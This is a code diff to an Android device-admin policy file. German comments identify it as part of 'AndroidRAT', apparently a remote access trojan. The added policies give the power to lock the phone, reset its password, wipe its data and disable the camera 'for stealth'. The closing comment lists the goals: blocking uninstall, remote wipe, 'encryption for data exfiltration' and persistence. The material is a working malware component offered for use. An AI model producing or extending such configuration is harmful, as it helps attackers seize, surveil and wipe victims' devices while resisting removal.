@@ -1,6 +1,40 @@
-<device-admin>
+<?xml version="1.0" encoding="utf-8"?>
+<!-- 
+    AndroidRAT Device Admin Konfiguration
+    Version 2.0 - Android 15 (API Level 35)
+    Ermöglicht Anti-Uninstall und Geräte-Steuerung
+-->
+<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
     <uses-policies>
+        <!-- Gerätesperre & Passwort-Management -->
         <force-lock />
+        <reset-password />
+        
+        <!-- Geräteverschlüsselung -->
+        <encrypted-storage />
+        
+        <!-- Datenlöschung (Emergency Wipe) -->
         <wipe-data />
+        
+        <!-- Passwort-Richtlinien -->
+        <limit-password />
+        <watch-login />
+        
+        <!-- Kamera-Deaktivierung (für Stealth) -->
+        <disable-camera />
+        
+        <!-- Keyguard-Features -->
+        <disable-keyguard-features />
     </uses-policies>
 </device-admin>
+
+<!-- 
+    Android 15 Device Admin Funktionen:
+    
+    1. Anti-Uninstall: Verhindert Deinstallation ohne Admin-Rechte
+    2. Remote Wipe: Notfall-Datenlöschung bei Kompromittierung
+    3. Device Lock: Fernsteuerung der Gerätesperre
+    4. Encryption: Verschlüsselung für Datenexfiltration
+    
+    Wichtig: Device Admin ist kritisch für Persistenz!
+-->
